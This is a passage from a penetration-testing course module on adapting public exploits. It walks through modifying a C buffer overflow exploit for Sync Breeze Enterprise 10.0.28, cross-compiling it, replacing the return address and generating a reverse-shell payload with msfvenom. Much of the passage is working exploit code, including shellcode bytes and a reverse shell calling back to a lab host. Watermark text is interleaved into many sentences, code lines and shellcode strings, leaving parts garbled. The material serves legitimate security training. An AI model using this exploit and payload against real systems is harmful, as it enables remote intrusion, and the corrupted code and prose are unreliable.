@@ -1,0 +1,1044 @@
+                                                                                                                       Penetration Testing with Kali Linux
+
+14 Fixing Exploits
+
+In this Module, we will cover the following Learning Units:
+
+· Fixing Memory Corruption Exploits
+
+· Fixing Web Exploits
+
+Writing an exploit from scratch can be difficult and time-consuming. But it can be equally difficult
+and time-consuming to find a public exploit that fits our exact needs during an engagement. One
+great compromise is to modify a public exploit to suit our specific needs.
+
+However, writing exploits from scratch comes with some challenges. In the case of memory
+corruption exploits like buffer overflows, we may need to modify basic target parameters such as
+the socket information, return address, payload, and offsets.
+
+Understanding each of these elements is very important. For example, if our target is running
+Windows Server 2022 and we attempt to run an exploit that was written and tested against
+Windows 2003 Server, newer protection mechanisms such as Address Space Layout
+Randomization (ASLR) will most likely result in an application crash. These kinds of events could
+lock down that attack vector for a period of time or even impact the production environment, both
+situations we should avoid.
+
+     Before running a penetration test, its scope should be defined upfront, and the client
+
+     eisnhxpmoluoinlidtdwa, acescpeplpaetnnaetnotryarputionot.nentetsiatledrsowwnetsimhoeurlidskaslwaasysWsohcsiitatrltiveoedw twoimthinatimtaiczke  vectors. Keeping this
+                                                                                                                                                     the impact of any
+
+To   avoid potential downtime, instead of  nfieriJenedgfefdor,fefyaandmtiesmstaittcahgeadinesxtploouitr,                                             we should always read
+the  exploit code carefully, modify it as                                                                                                            own sandboxed target
+
+whenever possible.           vfoarriathObSele-s5sa7em7x5ep21lva9ui0nlnwerhayboilnitlyin, eearcehsowurrictteesnlfikoer  the Exploit Database
+                                                                                                                       different target
+     These target-specific
+     host multiple exploits
+
+     operating system versions and architectures.
+
+We may also benefit from porting an exploit to a different language to include additional pre-
+written libraries and extend the exploit functionality by importing it to an attack framework.
+
+Finally, exploits that are coded to run on a particular operating system and architecture may need
+to be ported to a different platform. As an example, we often encounter situations where an
+exploit needs to be compiled on Windows, but we want to run it on Kali.
+
+Among fixing memory corruption exploits, we are going to learn how to adjust exploits related to
+web applications, which typically involves modifying the socket option and application-specific
+parameters such as URI paths and cookies among others.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                    413
+                                                                          Penetration Testing with Kali Linux
+
+In this Module, we will overcome many of these challenges as we walk through the steps required
+to modify public memory corruption exploits and web exploit code to fit a specific attack platform
+and target.
+
+14.1 Fixing Memory Corruption Exploits
+
+Memory corruption exploits, such as buffer overflows, are relatively complex and can be difficult
+to modify.
+
+This Learning Unit covers the following Learning Objectives:
+· Understand high-level Buffer Overflow Theory
+· Cross-compile Binaries
+· Modify and Update Memory Corruption Exploits
+
+Before we jump into an example, we will first discuss the high-level theory behind stack-based
+buffer overflow vulnerabilities. We'll then cover the methodology and highlight some of the
+considerations and challenges we will face when fixing these kinds of exploits.
+
+14.1.1 Buffer Overflow in a Nutshell
+
+In general, a buffer is a memory area intended to hold content that is often sent by the user for
+later processing. Some buffers have a dynamic size, while others have a fixed, preallocated size.
+
+Buffer overflows are one of the earliest memory corruption vulnerabilities that have been
+                                                  althWohuigthlomw any
+undermining software since the late 1980s, and                            mitigations  have                                                                            been  developed
+during the years, they are still relevant today.
+
+cFporroonvmtiedneatdgbioniredtsh'seb-eefoyyelolonwvdieintwhge, dsaiatagbcruakfmfleim.r iot vaenrdfloowvJeervfruuflrnneseyrinabtoilitthyeoacdcjuarcsenwt hmeenmevoerry  the user's provided
+                                                                                                                                                                       area. An example is
+
+OS-57752190
+
+                                       Figure 218: Stack-Based Buffer Overflow - Exploitation Stages
+
+In this diagram, a buffer has been designed to contain a password that can be a maximum of 8
+bytes. If a user provides an input consisting of the characters "password" followed by the
+numbers "4" and "3", the last two digits are going to overflow the buffer by two bytes. If not
+handled correctly, this event might lead to unexpected behavior, as we'll observe shortly.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                     414
+                                                                                                                 Penetration Testing with Kali Linux
+
+Although writing buffer overflow exploits is beyond the scope of the course, we're
+learning how they work so that we can understand when and how to adjust them
+whenever we encounter these attack vectors during an engagement.
+
+Memory corruption vulnerabilities can occur in different parts of a program such as the heap or
+the stack. The heap is dynamically managed and typically stores large chunks of globally
+accessible data, while the stack's purpose is to store local functions' data, and its size is generally
+fixed.
+
+The stack often contains local variables like integers or buffers. For a practical example of how a
+buffer overflow can occur, let's review the following two-liner partial C code.
+
+*buffer[64]*
+...
+strcpy(buffer, argv[1]);
+
+                                       Listing 292 - Declaring a Buffer and moving user's data into it
+
+In the above example, a buffer of 64 characters has been declared and a user command line
+argument is copied into it via the strcpy function. This function copies the source string passed
+as a second parameter into the buffer passed as the first parameter. This function is marked as
+unsafe since it does not check if the destination address has enough space to fit the originating
+string, which could lead to unexpected application behavior.
+
+The stack makes room for the exact space needed by the buffer (64 bytes in our case), along with
+
+function parameters and the return address. The return address is a memory address that stores
+                      ibsebeixgegceurtethdaonnctheethdeeosntienarutinonninbWghuihftfaelsro'swcosmpapcleet,edit.
+the next function to                                                                                             could  overwrite  the  return
+If the user's input
+
+address.   the  return  address  has  significJaenftfrimeyplications      because                                when   a  function  ends,            it
+Rewriting
+
+aeIrfexssaewpncoueanltlte.stsLaibectltehk'seefroerrhextakaesminescipntoirennugttchrtoteirolaenocx,vkpweolrohOftiiStccha-hue5tri7lorro7eena5ntu2dst1rtscna9o0tghadedeesdrifnreoetsrsutsarrun, sctathtaideocdynkrsm-eb.saassyienedsvibednuetfufEeaIrPlloy/RvceIoPrfn,lotthrwoel aitnthtseatcrpukrc.otgiornampofinlotewr
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                415
+                                                                                                                Penetration Testing with Kali Linux
+
+Figure 219: Stack-Based Buffer OveWrhfliotwl-oEwxploitation Stages
+Tbeheisn iimniatigaelizielldusattrarutenstimthereaenddifitfsersepnat csetaretesseJerovffefdrtheieyn
+                                                                                                     stack. In  the leftmost column,     the buffer has
+                                                                                                     memory.    Below this, in red, the  return address
+
+thcthhhoeealdrrusaescteuttrehrnrehsaa, scdmodserrereaensnctsitn8. g0mi"teAmf"ilcloshryoanraalycOdSthde-arr5esl7fs,7ost5h.f2u1tIhs9ne0fitallhivneagilcaoebunltettrhbaeul fepfenartn.ireHel,o6wt4he-ebvyeutre,sielnornthginepbsuuctfefencraoarninotadoinonsvtehjruewsrrtiigti3hn2tg,
+
+As the letter "A" in hexadecimal converts to "41", the return address would be overwritten with a
+value of "\x41\x41\x41\x41".
+
+Instead of rewriting the address with four A's, an attacker usually rewrites the return address with
+a valid and mapped memory address containing shellcode that gives the attacker full control of
+the target machine.
+
+A typical buffer overflow attack scenario involves overwriting the return address with a
+JMP ESP instruction, which instructs the program to jump to the stack and execute the
+shellcode that has been injected right after the beginning of the payload.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                 416
+                                                                                          Penetration Testing with Kali Linux
+
+This kind of attack has been documented since the late 1980s, prompting the development of
+various mitigations like ASLR and Executable Space Protection, among others. Since exploit
+mitigations are not in scope for this Module, we'll assume our target has none enabled.
+
+The general flow of a standard stack-based buffer overflow is straightforward. The exploit will:
+
+· Create a large buffer to trigger the overflow.
+
+· Take control of EIP by overwriting a return address on the stack, padding the large buffer
+      with an appropriate offset.
+
+· Include a chosen payload in the buffer prepended by an optional NOP sled.
+
+· Choose a correct return address instruction such as JMP ESP (or a different register) to
+      redirect the execution flow to the payload.
+
+As we fix the exploit, depending on the nature of the vulnerability, we may need to modify
+elements of the deployed buffer to suit our target such as file paths, IP addresses and ports,
+URLs, and more. If these modifications alter our offset, we must adjust the buffer length to
+ensure we overwrite the return address with the desired bytes.
+
+Although we could trust that the return address used in the exploit is correct, the more
+responsible alternative is to find the return address ourselves, especially if the one used is not
+part of the vulnerable application or its libraries. One of the most reliable ways to do this is to
+clone the target environment locally in a virtual machine and then use a debugger on the
+vulnerable software to obtain the memory address of the return address instruction.
+
+We must also consider changing the payload contained in the original exploit code.
+                                       tphuabtlicmuesxpt lobietWshrieptvrleeorswseen-tenagninienehreerdenttoddaentgeermr bineecahuoswe
+As mentioned in a previous Module,                                                                                                      they
+often contain hex-encoded payloads                                                                                                      they
+                                       alwaysJreefvfireewy
+function. Because of  this,  we  must                       the           payloads  used  in  public  exploits  or  better
+yet, insert our own.
+
+BWemxaahpdyelonceihtxwaccerolaumccdrtmeeearecstneeatrstarae. ipnAaSbyClaoIdaI doc,rhwaUreNaOISwcC-tiOe5ll7rDso7E,5b2wvc1ihho9ai0ucrshalycwtienercscluathdnaetdoebutrereraomkwitnnheeIPianapddpedplirceeanstdsioenanntwldyhpoeornrgtinlencaulunmdfberedormsinattnhhdee
+
+payload because they might be interpreted as control characters. For example, the null byte "\x00"
+
+is often interpreted as a string terminator and, if inserted in the payload, could prematurely
+
+truncate the attack buffer.
+
+While generating our own payload is advised whenever possible, there are exploits using custom
+payloads that are key to successfully compromising the vulnerable application. If this is the case,
+our only option is to reverse engineer the payload to determine how it functions and if it is safe to
+execute. This is difficult and beyond the scope of this Module, so we will instead focus on
+shellcode replacement.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                417
+                                                                          Penetration Testing with Kali Linux
+
+14.1.2 Importing and Examining the Exploit
+
+In this example, we'll target Sync Breeze Enterprise 10.0.28 and focus on one of the two available
+exploits. This will provide us with a working exploit for our target environment and allow us to
+walk through the modification process.
+
+Searching by product and version, we'll notice that one of the available exploits for this
+vulnerability is coded in C.
+
+kali@kali:~$ <cu>searchsploit "Sync Breeze Enterprise 10.0.28"</cu>
+
+---------------------------------------------------------------- ---------------------
+
+Exploit Title                                                             | Path (/usr/share/exploitdb/)
+
+---------------------------------------------------- ---------------------------------
+
+Sync Breeze Enterprise 10.0.28 - Denial of-Service (PoC) | windows/dos/43200.py
+
+Sync Breeze Enterprise 10.0.28 - Remote Buffer Over | exploits/windows/remote/42928.py
+
+Sync Breeze Enterprise 10.0.28 - Remote Buffer Over |
+
+<cr>exploits/windows/dos/42341.c</cr>
+
+---------------------------------------------------------------- ---------------------
+
+            Listing 293 - Searching for available exploits for our vulnerable software using searchsploit
+
+Denial of Service (DoS) exploits result in a simple application crash and no explicit exploitation
+path. We should normally avoid DoS exploits whenever we have better alternatives, as in our
+case. Instead, let's focus on the last two entries.
+
+The vulnerability is present in the HTTP server module where a buffer overflow condition is
+
+triggered on a POST request. While we suggest reading the entire Python exploit code, the core
+
+functionality of the exploit script can be summarized using the below code:
+
+offset = "A" * 780                     Whitlow
+JMP_ESP = "\x83\x0c\x09\x10"
+shellcode = "\x90"*16 + msf_shellcode
+
+ASembxuitnepfcomfleefoforiswritseyeti'anr7edc=8dlnu0roode, wfeswfdsmsei0enotoxrt1vhe+e0efr0awJH9mMr0TPiticT_lei8LEaPi3SsrthPtP.OwineOSNgi+-tSei2h5nTx9s7sht47h,rto5e-erw2uwSlq1ycelun9tctechi0aooseBpdntJrpeveeaeeupfnznlfoenddrien1es0rotyeae.u0nbr.r2ti.8lwsitEhiytxehpwlllocoaiotr'skdJsSeMuamwPnmidtEhaShry1Po6winNistOtisrPuescx.tipFolinoniatleolldyc,,altteheted'sebaxtrpietlofhlieyt
+
+review the differences between scripting languages such as Python and a compiled language
+
+such as C.
+
+While there are plenty of differences between the two languages, we will focus on two main
+differences that will affect us, including memory management and string operations.
+
+The first key difference is that scripting languages are executed through an interpreter and not
+compiled to create a stand-alone executable. Because scripting languages require an interpreter,
+we cannot run a Python script in an environment where Python is not installed. This could limit us
+in the field, especially if we need a stand-alone exploit (like a local privilege escalation) that must
+run in an environment that doesn't have Python pre-installed.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                   418
+                                                                                                                              Penetration Testing with Kali Linux
+
+     As an alternative, we could consider using PyInstaller, which packages Python
+     applications into stand-alone executables for various target operating systems.
+     However, given the nuances of exploit code, we suggest porting the code by hand
+
+Another difference between Python and C is that in a scripting language like Python,
+concatenating a string is very easy and usually takes the form of an addition between two strings:
+
+kali@kali:~$ <cu>python</cu>
+...
+>>> <cu>string1 = "This is"</cu>
+>>> <cu>string2 = " a test"</cu>
+>>> <cu>string3 = string1 + string2</cu>
+
+>>> <cu>print(string3)</cu>
+<cr>This is a test</cr>
+
+                                            Listing 295 - String concatenation example in Python
+
+Concatenating strings in this way is not allowed in a programming language such as C.
+
+Fixing C programs requires more precautions, as opposed to those written using Python. We will
+learn how to do this in C, since this will provide us with useful knowledge during a penetration test
+engagement.
+
+To begin the process of modifying our exploit, we will move the target exploit to our current
+working directory using SearchSploit's handy -m mirror (copy) option.
+
+F<kaicErllx>eip@CPlkoTUaoapyRtiiplLhteie::::d:~hS/$tCtuyotnss<:pcrcos//uu:Bs>hr/rhcos/aemeewere,awezr/we/cUk.eTahexEFlsxnppi-plt/l8loeo4ori2iUitp3tntdr4ibi1--c/s.dmoeecbdx<.4e1p/c20lc3otro.m4e0i>/1x.t<etJs2x/,e8/cpfwluwfi>oi-rnitedthRyosew/CmWs4Rohi/2Lttd3Felo4os1lBw//iu4nf2ef3e4tr1e.rOcmvienraftloorws(PoC)
+Wmoithdifitchaetioenxsp(loifLitaisntimnyg)ira2r9roe6re-reUdqsiuntgoirOseSed-oa5rutc7orh7sc5pho2loo1mi9mt 0ptoeilceodtphiyreethceetxoepxrplyol,oiittwttooetwhecoacruknrrieninntoswuporertkcaintrggidetitreetcontovryidroentemrmenint.e what
+Before even considering compilation, however, we'll notice the headers (such as winsock2.h)
+indicating that this code was meant to be compiled on Windows:
+
+#include <inttypes.h>
+#include <stdio.h>
+#include <winsock2.h>
+#include <windows.h>
+
+                               Listing 297 - Displaying the C headers at the beginning of the exploit code
+
+Although we could attempt to compile this on Windows, we will instead cross-compile this exploit
+using Kali.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  419
+                                                                          Penetration Testing with Kali Linux
+
+14.1.3 Cross-Compiling Exploit Code
+
+To avoid compilation issues, it is generally recommended to use native compilers for the specific
+operating system targeted by the code; however, this may not always be an option.
+
+In some scenarios, we might only have access to a single attack environment (like Kali) but need
+to leverage an exploit coded for a different platform. In such cases, a cross-compiler can be
+extremely helpful.
+
+We will use the extremely popular mingw-w64 cross-compiler in this section. If it's not already
+present, we can install it using apt.
+
+kali@kali:~$ <cu>sudo apt install mingw-w64</cu>
+                                        Listing 298 - Installing the mingw-w64 cross-compiler in Kali
+
+We can use mingw-w64 to compile the code into a Windows Portable Executable (PE) file. The
+first step is to determine if the exploit code compiles without errors. We can do this by invoking
+the cross-compiler, passing the C source file as the first argument and the output PE file name as
+the second argument, prepended by the -o parameter.
+
+kali@kali:~$ <cu>i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe</cu>
+
+/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x97): undefined
+
+reference to <cr>`_imp__WSAStartup@8'</cr>
+
+/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0xa5): undefined
+
+reference to `_imp__WSAGetLastError@0'
+
+/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0xe9): undefined
+
+reference to `_imp__socket@12'
+
+/r/rueeusffsreerr//rbeebniinnccn/e/eii66ttoo8866--``ww__66ii44mm--ppmm__ii__nniWggnSwweA33Gt22_eat--Ldlladddsr::t@4E//'rttrmmoppr//@cc0cc'hhss00xxzzaa..oo::44W22hi33t44l11o..wcc::((..tteexxtt++00xxf1c26))::unundedfefinineded
+
+rrr///cr/eeuueeouufsslsfsffrleerrreeerrrr////beeecbebbiininintnnncccn2cne/:/eee//iiiiett6tt666r888ooo8o6r666----````owwww__r__6666iiii:4444mmmm----pppplmmmmd____iiii____nnnnrshccggggetloewwwwonnto3333ndsun2222ere@sc1ns@----to64elllldc''@ddddO1k::::S12e-'t////5@etttt77x4mmmm5i'pppp2t////1cccc9scccc0thhhhassssJt0000euxxxxfszzzzfaaaar....eooooy::::44442222333344441111....cccc::::((((....tttteeeexxxxtttt++++0000xxxx1111eb46b68f))))::::  undefined
+                                                                                                                                                                                                                                                                                                                                                                                                                                                     undefined
+                                                                                                                                                                                                                                                                                                                                                                                                                                                     undefined
+                                                                                                                                                                                                                                                                                                                                                                                                                                                     undefined
+
+Listing 299 - Errors displayed after attempting to compile the exploit using mingw-64
+
+Something went wrong during the compilation process and although the errors from Listing 299
+may be unfamiliar, a simple Google search for the first error related to "WSAStartup" reveals that
+this is a function found in winsock.h. Further research indicates that these errors occur when the
+linker cannot find the winsock library, and that adding the -lws2_32 parameter to the i686-w64-
+mingw32-gcc command should fix the problem.
+
+kali@kali:~$ <cu>i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32</cu>
+
+kali@kali:~$ <cu>ls -lah</cu>
+total 372K
+drwxr-xr-x 2 root root 4.0K Feb 24 17:13 .
+drwxr-xr-x 17 root root 4.0K Feb 24 15:42 ..
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                                                                                                                                                        420
+                                                                                                                                      Penetration Testing with Kali Linux
+
+-rw-r--r-- 1 root root 4.7K Feb 24 15:46 42341.c
+-rwxr-xr-x 1 root root 355K Feb 24 17:13 <cr>syncbreeze_exploit.exe</cr>
+
+      Listing 300 - Successfully compiling the code after adjusting the mingw-w64 command to link the winsock library
+
+This time, mingw32 produced an executable without generating any compilation errors. With the -
+l option, we can instruct mingw-w64 to search for the ws2_32 DLL and include it in the final
+executable via static linking.
+
+We already know that this exploit targets a remotely accessible vulnerability, which means that
+our code needs to establish a connection to the target at some point.
+
+Inspecting the C code, we'll notice that it uses hard-coded values for the IP address and port
+fields:
+
+printf("[>] Socket created.\n");
+server.sin_addr.s_addr = inet_addr("<cr>10.11.0.22</cr>");
+server.sin_family = AF_INET;
+server.sin_port = htons(<cr>80</cr>);
+
+                             Listing 301 - Identifying the code lines responsible for the IP address and port
+
+These will be the first values that we'll need to adjust in our exploit.
+
+14.1.4 Fixing the Exploit
+
+Let's more closely review the C code. Further inspection reveals the use of a return address
+
+located in the Visual Basic 6.0 runtime msvbvm60.dll, which is not part of the vulnerable
+
+software. Examining the loaded modules in the debugger on our Windows client, we notice that
+
+this DLL is absent,    mfiresatnnienegdthtoatstthaertrethtuerSnyandcdBrersesezwWehiliSl tnelorovtwicbee  valid for our target.        client.  Next,           we
+To verify this, we'll                                                                                    on the Windows 10
+
+can launch Immunity Debugger as      poarndemstehinentisVJbteiryefawcftorhmere,ycecknliinucgk, tthohenenNFEialxeme>ceuaAtanttbdalecPham,thaondvdualleussee.sleF.crtomthethseyrnec, bwres
+process. Once attached, we'll click
+can verify that msvbvm60.dll is not
+
+Given that the Python  wv=eer"sc\ixao8nn3Or\oSex-fp05tlc7ah7\ce5xe20e19tx9h\p0xel1ot0iat"r;igse/mt/rae0rtkxue1rd0n0a9a0sdcdE8r3DesBs  Verified and thus, been  already
+proven to be working,                                                                                                                 with the one contained   in that
+version:
+
+unsigned char retn[]
+
+                       Listing 302 - Changing the return address
+
+If we do not have a return address from a previously developed exploit, we have a few options to
+consider. The first, and most recommended option, is to recreate the target environment locally
+and use a debugger to determine this address.
+
+If this is not an option, we could use information from other publicly available exploits to find a
+reliable return address that will match our target environment. For example, if we needed a return
+address for a JMP ESP instruction on Windows Server 2019, we could search for it in public
+exploits leveraging different vulnerabilities targeting that operating system. This method is less
+reliable and can vary widely depending on the protections installed on the operating system.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                       421
+                                                                          Penetration Testing with Kali Linux
+
+During a "vanilla" buffer overflow, we should not rely on hard-coded JMP ESP addresses coming
+from system DLLs, since these are all randomized at boot time due to ASLR. Instead, we should
+try to find these instructions in non-ASLR modules inside the vulnerable application whenever
+possible.
+
+We could also obtain a return address directly from the target machine. If we have access to our
+target as an unprivileged user and want to run an exploit that will elevate our privileges, we can
+copy the DLLs that we are interested in onto our attack machine. We can then leverage various
+tools, such as disassemblers like objdump, which is installed by default on Kali.
+
+Continuing our analysis of this C exploit, we'll notice that the shellcode variable seems to hold the
+payload. Since it is stored as hex bytes, we cannot easily determine its purpose. The only hint
+given by the author refers to a NOP slide that is part of the shellcode variable:
+
+unsigned char shellcode[] =
+   <cr>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE</cr>
+   "\xdb\xda\xbd\x92\xbc\xaf\xa7\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
+   "\x52\x31\x68\x17\x83\xc0\x04\x03\xfa\xaf\x4d\x52\x06\x27\x13"
+   "\x9d\xf6\xb8\x74\x17\x13\x89\xb4\x43\x50\xba\x04\x07\x34\x37"
+   "\xee\x45\xac\xcc\x82\x41\xc3\x65\x28\xb4\xea\x76\x01\x84\x6d"
+   "\xf5\x58\xd9\x4d\xc4\x92\x2c\x8c\x01\xce\xdd\xdc\xda\x84\x70"
+   "\xf0\x6f\xd0\x48\x7b\x23\xf4\xc8\x98\xf4\xf7\xf9\x0f\x8e\xa1"
+   "\xd9\xae\x43\xda\x53\xa8\x80\xe7\x2a\x43\x72\x93\xac\x85\x4a"
+   "\x5c\x02\xe8\x62\xaf\x5a\x2d\x44\x50\x29\x47\xb6\xed\x2a\x9c"
+   "\xc4\x29\xbe\x06\x6e\xb9\x18\xe2\x8e\x6e\xfe\x61\x9c\xdb\x74"
+   "\x2d\x81\xda\x59\x46\xbd\x57\x5c\x88\x37\x23\x7b\x0c\x13\xf7"
+   "\xe2\x15\xf9\x56\x1a\x45\xa2\x07\xbe\x0e\x4f\x53\xb3\x4d\x18"
+   "\x90\xfe\x6d\xd8\xbe\x89\x1e\xea\x61\x22\x88\x46\xe9\xec\x4f"
+
+  """\\\xxx7baf80\\\xxxbc005a\\\xxx134915\\\xxx8d32f5\\\xxx22570a\\\xxxe1f4bc\\\xxxcad269\\\xxx0ff166\\\xxx99b03a\\\xxxdb8f4a\\\xxxbfe6f9W\\\hixxxt963l0e2o\\\wxxxf3b59a\\\xxxd7c20a\\\xxxee9911"""
+  """"\\\\xxxx598fee6d\\\\xxxxb6b3cc64\\\\xxxx5a914648\\\\xxxx645772b6\\\\xxxx9b0e8df8\\\\xxxxe1034114\\\\xxxx40751df0\\\\xxxxd404b4db\\\\xxxx2bcfa6d7J\\\\exxxxf3ba8f8556r\\\\exxxxybdf2b4f0\\\\xxxxb13f1457\\\\xxxxd93f378e\\\\xxxx599c5a7a\\\\xxxxcea865ec""""
+  """""\\\\\xxxxx3fcce84852\\\\\xxxxxaa3b5f4b18\\\\\xxxxx3e6c61b954\\\\\xxxxx78d8a80bc6\\\\\xxxxx4ac333ec9a\\\\\xxxxx9150698800"\\\\Oxxxx;S151b-43f95\\\\77xxxx566652df361\\\\9xxxx095172489\\\\xxxxf82c58d9\\\\xxxxf6162291\\\\xxxx13391c96\\\\xxxx7bfd645d\\\\xxxx5c299422\\\\xxxxf966fbd2""""
+
+                    Listing 303 - The shellcode variable content includes a NOP slide before the actual payload
+
+Since bad characters are already listed in the Python exploit, we can generate our own payload
+with msfvenom, remembering to target the x86 platform and format it for C code:
+
+kali@kali:~$ <cu>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443
+EXITFUNC=thread -f c ­e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"</cu>
+...
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of c file: 1500 bytes
+unsigned char buf[] =
+"\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  422
+                                                                                                                                                                                                      Penetration Testing with Kali Linux
+
+"\x52\x31\x72\x17\x83\xc2\x04\x03\xd7\xdf\xca\x6c\xeb\x08\x88"
+"\x8f\x13\xc9\xed\x06\xf6\xf8\x2d\x7c\x73\xaa\x9d\xf6\xd1\x47"
+"\x55\x5a\xc1\xdc\x1b\x73\xe6\x55\x91\xa5\xc9\x66\x8a\x96\x48"
+"\xe5\xd1\xca\xaa\xd4\x19\x1f\xab\x11\x47\xd2\xf9\xca\x03\x41"
+"\xed\x7f\x59\x5a\x86\xcc\x4f\xda\x7b\x84\x6e\xcb\x2a\x9e\x28"
+"\xcb\xcd\x73\x41\x42\xd5\x90\x6c\x1c\x6e\x62\x1a\x9f\xa6\xba"
+"\xe3\x0c\x87\x72\x16\x4c\xc0\xb5\xc9\x3b\x38\xc6\x74\x3c\xff"
+"\xb4\xa2\xc9\x1b\x1e\x20\x69\xc7\x9e\xe5\xec\x8c\xad\x42\x7a"
+"\xca\xb1\x55\xaf\x61\xcd\xde\x4e\xa5\x47\xa4\x74\x61\x03\x7e"
+"\x14\x30\xe9\xd1\x29\x22\x52\x8d\x8f\x29\x7f\xda\xbd\x70\xe8"
+"\x2f\x8c\x8a\xe8\x27\x87\xf9\xda\xe8\x33\x95\x56\x60\x9a\x62"
+"\x98\x5b\x5a\xfc\x67\x64\x9b\xd5\xa3\x30\xcb\x4d\x05\x39\x80"
+"\x8d\xaa\xec\x07\xdd\x04\x5f\xe8\x8d\xe4\x0f\x80\xc7\xea\x70"
+"\xb0\xe8\x20\x19\x5b\x13\xa3\xe6\x34\x29\x37\x8f\x46\x4d\x36"
+"\xf4\xce\xab\x52\x1a\x87\x64\xcb\x83\x82\xfe\x6a\x4b\x19\x7b"
+"\xac\xc7\xae\x7c\x63\x20\xda\x6e\x14\xc0\x91\xcc\xb3\xdf\x0f"
+"\x78\x5f\x4d\xd4\x78\x16\x6e\x43\x2f\x7f\x40\x9a\xa5\x6d\xfb"
+"\x34\xdb\x6f\x9d\x7f\x5f\xb4\x5e\x81\x5e\x39\xda\xa5\x70\x87"
+"\xe3\xe1\x24\x57\xb2\xbf\x92\x11\x6c\x0e\x4c\xc8\xc3\xd8\x18"
+"\x8d\x2f\xdb\x5e\x92\x65\xad\xbe\x23\xd0\xe8\xc1\x8c\xb4\xfc"
+"\xba\xf0\x24\x02\x11\xb1\x45\xe1\xb3\xcc\xed\xbc\x56\x6d\x70"
+"\x3f\x8d\xb2\x8d\xbc\x27\x4b\x6a\xdc\x42\x4e\x36\x5a\xbf\x22"
+"\x27\x0f\xbf\x91\x48\x1a";
+
+                    Listing 304 - Using msfvenom to generate a reverse shell payload that fits our environment
+
+After completing the above-mentioned changes, our exploit code now appears as so:
+
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define DEFAULT_BUFLEN 512
+
+#include <inttypes.h>                    Whitlow
+#include <stdio.h>
+#include <winsock2.h>
+
+D#iWnORciWcsiSlDnnSOthuatrtACSdKrDueeicrEAntrTTeR<dcAeewRssscviebuowv;nqcblsuduktfauoel;f;asw[edstdnD(.rEch_F=h>iAanDUrELTsF*Ae_rrBUeUvLqeTFuO_LreSEB;s-UNt5]F,77;L5Ei2Nn1;t90reJqeufefsrte_ysize) {
+
+printf("\n[>] Initialising Winsock...\n");
+if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+{
+
+       printf("[!] Failed. Error Code : %d", WSAGetLastError());
+       return 1;
+}
+
+printf("[>] Initialised.\n");
+if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
+{
+
+       printf("[!] Could not create socket : %d", WSAGetLastError());
+}
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                              423
+                                                                          Penetration Testing with Kali Linux
+
+       printf("[>] Socket created.\n");
+       <cr>server.sin_addr.s_addr = inet_addr("192.168.50.120");</cr>
+       server.sin_family = AF_INET;
+       <cr>server.sin_port = htons(80);</cr>
+
+       if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
+       {
+
+              puts("[!] Connect error");
+              return 1;
+       }
+       puts("[>] Connected");
+
+       if (send(s, request, request_size, 0) < 0)
+       {
+
+              puts("[!] Send failed");
+              return 1;
+       }
+       puts("\n[>] Request sent\n");
+       closesocket(s);
+       return 0;
+}
+
+void EvilRequest() {
+
+       char request_one[] = "POST /login HTTP/1.1\r\n"
+                                           <cr>"Host: 192.168.50.120\r\n"</cr>
+                                           "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0)
+
+Gecko/20100101 Firefox/52.0\r\n"
+                                           "Accept:
+
+text/html,application/xht"""mCARlcoe+fncxenemreplect,-traL:ipaopnhnlg:tiutcapcagl:teo/i:/soe1ne9\/n2rx.-\m1Unl6"SW;8,hiq.et=5nl00;o..qw91=,20*0.//5*l\;orqg\=in0n".\8r\\nr\"n"
+     char request_two[] ="""CCo\onrn\ttnee\nnrtt\--LTneuyspneegrt:hnJaa:epmfpe"f;=lr"iec;yation/x-www-form-urlencoded\r\n"
+     <<mcmheeccrgmmas>>srieeu*ntnt(tsp(appigidaaddndnidiedidintginngcaglh=,_a+bmr0aixuln4rflefi1o,ettcrni_[(ias]lniO_niiSb=zit-tieu5f"ia77=alf\5_lex2_7br81bu8_390usf\0iff;xezf0erecr_\s_-xis0iz91ze,\)ex);01;x0<0"/0;c,g/>1/);0x10090c83</cr>
+
+       <cr>
+       unsigned char shellcode[] =
+       "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
+     "\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
+     "\x52\x31\x72\x17\x83\xc2\x04\x03\xd7\xdf\xca\x6c\xeb\x08\x88"
+     "\x8f\x13\xc9\xed\x06\xf6\xf8\x2d\x7c\x73\xaa\x9d\xf6\xd1\x47"
